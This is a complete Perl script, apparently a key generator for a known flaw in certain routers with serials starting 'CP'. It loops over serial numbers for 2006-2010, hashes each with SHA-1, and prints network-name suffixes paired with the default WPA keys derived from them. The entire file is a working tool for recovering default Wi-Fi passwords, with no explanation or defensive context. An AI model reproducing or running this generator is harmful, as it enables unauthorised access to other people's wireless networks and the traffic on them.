#!/usr/bin/perl

use strict;
use Digest::SHA qw/sha1_hex/;

my @serial   = (qw/C P/);
my @hexTable = (0..9,'A'..'H');

# Iterate over the years (2006 - 2010)
for my $year (6..10) {

    ($serial[2], $serial[3]) = split '', sprintf("%02d", $year);

    # Iterate over the weeks
    for my $week (1..52) {
        ($serial[4], $serial[5]) = split '', sprintf("%02d", $week);

        # Iterate over random chars 1st
        for my $x1 (0..9,'A'..'Z') {
            $serial[6] = $hexTable[((ord($x1) & 0xf0) >> 4)];
            $serial[7] = $hexTable[(ord($x1) & 0x0f)];

            # Iterate over random chars 2nd
            for my $x2 (0..9,'A'..'Z') {
                $serial[8] = $hexTable[((ord($x2) & 0xf0) >> 4)];
                $serial[9] = $hexTable[(ord($x2) & 0x0f)];

                # Iterate over random chars 3rd
                for my $x3 (0..9,'A'..'Z') {
                    $serial[10] = $hexTable[((ord($x3) & 0xf0) >> 4)];
                    $serial[11] = $hexTable[(ord($x3) & 0x0f)];

                    # Get SHA1
                    my $sha = sha1_hex(join "", @serial);

                    my $wpa   = uc substr($sha, 0, 10);
                    my $essid = uc substr($sha, -6, 6);

                    printf("%s,%s\n", $essid, $wpa);

                }
            }
        }
    }
}
